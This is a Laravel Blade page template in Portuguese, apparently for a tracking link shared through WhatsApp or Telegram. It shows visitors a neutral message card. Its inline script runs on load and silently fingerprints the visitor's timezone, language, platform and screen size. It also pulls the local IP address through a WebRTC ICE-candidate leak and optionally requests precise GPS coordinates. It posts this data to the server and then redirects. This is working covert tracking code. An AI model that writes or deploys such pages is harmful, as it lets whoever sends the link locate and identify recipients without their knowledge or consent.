<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $ogTitulo }}</title>

    {{-- Open Graph: preview automático no WhatsApp/Telegram --}}
    <meta property="og:type"        content="website">
    <meta property="og:title"       content="{{ $ogTitulo }}">
    <meta property="og:description" content="{{ $ogDescricao }}">
    @if($ogImagem['url'])
    <meta property="og:image"       content="{{ $ogImagem['url'] }}">
    @if(str_starts_with($ogImagem['url'], 'https://'))
    <meta property="og:image:secure_url" content="{{ $ogImagem['url'] }}">
    @endif
    @if($ogImagem['type'])
    <meta property="og:image:type"  content="{{ $ogImagem['type'] }}">
    @endif
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt"   content="{{ $ogTitulo }}">
    @endif
    <meta property="og:url"         content="{{ $ogUrl }}">
    <meta name="twitter:card"       content="summary_large_image">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f3f4f6;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #374151;
        }
        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,.08);
            padding: 48px 40px;
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .icon {
            width: 56px;
            height: 56px;
            background: #fef3c7;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }
        .icon svg { width: 28px; height: 28px; stroke: #d97706; }
        h1 { font-size: 1.1rem; font-weight: 600; color: #111827; margin-bottom: 8px; }
        p  { font-size: 0.9rem; color: #6b7280; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round"
                    d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
            </svg>
        </div>
        <h1>{{ $mensagem }}</h1>
        <p>Caso precise de suporte, entre em contato com o remetente.</p>
    </div>

    <script>
    (function () {
        var token    = @json($token);
        var accessId = @json($accessUuid);
        var captureGps = @json($captureGps);
        var redirectUrl = @json($redirectUrl);
        var endpoint = window.location.pathname.replace(/\/$/, '') + '/device';
        var csrf     = @json(csrf_token());

        var dados = {
            // Timezone e GMT real do dispositivo
            gmt:       '',
            // IP local via WebRTC
            ip_local:  null,
            // Fingerprint básico
            idioma:    navigator.language || navigator.userLanguage || '',
            plataforma: navigator.userAgentData
                            ? (navigator.userAgentData.platform || navigator.platform || '')
                            : (navigator.platform || ''),
            resolucao: screen.width + 'x' + screen.height,
        };

        // GMT real
        try {
            var tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
            var offset = new Date().getTimezoneOffset();
            var h      = Math.floor(Math.abs(offset) / 60);
            var m      = Math.abs(offset) % 60;
            var s      = offset <= 0 ? '+' : '-';
            dados.gmt  = 'GMT' + s + String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ' (' + tz + ')';
        } catch(e) {}

        function enviar(valorWebRtc, extras) {
            if (valorWebRtc) dados.ip_local = valorWebRtc;

            var formData = new FormData();
            formData.append('_token', csrf);

            if (accessId) {
                formData.append('access_id', accessId);
            }

            Object.keys(dados).forEach(function(chave) {
                if (dados[chave] !== null && dados[chave] !== undefined) {
                    formData.append(chave, dados[chave]);
                }
            });

            Object.keys(extras || {}).forEach(function(chave) {
                if (extras[chave] !== null && extras[chave] !== undefined) {
                    formData.append(chave, extras[chave]);
                }
            });

            if (!extras && navigator.sendBeacon && navigator.sendBeacon(endpoint, formData)) {
                return Promise.resolve();
            }

            return fetch(endpoint, {
                method: 'POST',
                headers: { 'X-CSRF-TOKEN': csrf },
                body: formData,
                credentials: 'same-origin',
                keepalive: true
            }).catch(function(){});
        }

        function redirecionar() {
            if (!redirectUrl) {
                return;
            }

            window.location.href = redirectUrl;
        }

        function solicitarGps(callback) {
            callback = callback || function(){};

            if (!captureGps || !accessId || !navigator.geolocation || !window.isSecureContext) {
                callback();
                return;
            }

            var finalizado = false;

            function finalizar() {
                if (finalizado) return;

                finalizado = true;
                callback();
            }

            navigator.geolocation.getCurrentPosition(function(posicao) {
                if (!posicao || !posicao.coords) {
                    finalizar();
                    return;
                }

                Promise.resolve(enviar(null, {
                    gps_latitude: posicao.coords.latitude,
                    gps_longitude: posicao.coords.longitude,
                    gps_accuracy: posicao.coords.accuracy
                })).then(finalizar);
            }, finalizar, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }

        function extrairEnderecoDoCandidate(candidate) {
            var partes = String(candidate || '').trim().split(/\s+/);
            return partes.length >= 5 ? partes[4] : null;
        }

        function enderecoWebRtcValido(endereco) {
            if (!endereco) return false;

            var valor = String(endereco).toLowerCase();

            // Navegadores modernos mascaram o IP local com mDNS (*.local).
            if (/^[a-z0-9-]{1,63}(\.[a-z0-9-]{1,63})*\.local$/.test(valor)) {
                return true;
            }

            return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|fd|fc)/i.test(valor);
        }

        try {
            var RTCPeer = window.RTCPeerConnection
                       || window.webkitRTCPeerConnection
                       || window.mozRTCPeerConnection;

            if (!RTCPeer) {
                Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
                return;
            }

            var pc = new RTCPeer({ iceServers: [] });
            pc.createDataChannel('');

            var enviado = false;
            var melhorEndereco = null;

            function escolherEndereco(endereco) {
                if (!enderecoWebRtcValido(endereco)) return;

                // Se o navegador entregar IP privado real, ele tem prioridade sobre mDNS.
                if (!melhorEndereco || !/\.local$/i.test(endereco)) {
                    melhorEndereco = endereco;
                }
            }

            function finalizar() {
                if (enviado) return;

                enviado = true;
                try { pc.close(); } catch(e) {}
                Promise.resolve(enviar(melhorEndereco)).then(function() { solicitarGps(redirecionar); });
            }

            function processarCandidate(candidate) {
                escolherEndereco(extrairEnderecoDoCandidate(candidate));
            }

            function processarSdp(sdp) {
                String(sdp || '').split(/\r?\n/).forEach(function(linha) {
                    if (linha.indexOf('candidate:') !== -1) {
                        processarCandidate(linha.replace(/^a=/, ''));
                    }
                });
            }

            pc.onicecandidate = function(e) {
                if (!e || !e.candidate || !e.candidate.candidate) {
                    finalizar();
                    return;
                }

                processarCandidate(e.candidate.candidate);

                if (melhorEndereco && !/\.local$/i.test(melhorEndereco)) {
                    finalizar();
                }
            };

            pc.createOffer()
                .then(function(offer) { return pc.setLocalDescription(offer); })
                .then(function() { processarSdp(pc.localDescription && pc.localDescription.sdp); })
                .catch(function(){ finalizar(); });

            setTimeout(finalizar, 4000);

        } catch(e) {
            Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
        }
    })();
    </script>
</body>
</html>
